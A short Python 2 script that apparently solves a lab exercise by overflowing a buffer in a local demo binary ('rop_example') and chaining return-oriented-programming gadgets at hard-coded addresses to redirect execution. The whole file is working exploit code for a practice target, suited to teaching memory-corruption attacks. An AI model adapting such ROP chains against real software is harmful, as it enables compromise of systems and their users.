#!/usr/bin/python2

import os
import struct

# We find these values using ROPGadget in GDB via pwndbg.
pop_ret_gadget = 0x0804920b
exec_string = 0x80491b6
add_all = 0x80491d3
add_all_args = 0x804920d + 4

# Bytes used to overflow the buffer.
payload =  "A" * 0x6c
payload += "BBBB"

# executing a pointer redirection attack.
# payload += struct.pack("I", add_all)

# executing a pointer redirection attack.
payload += struct.pack("I", add_all_args)
payload += struct.pack("I", pop_ret_gadget)
payload += struct.pack("I", 0xdeadd00d)

# Executing the string we changed.
payload += struct.pack("I", exec_string)

os.system("./rop_example \"%s\"" % payload)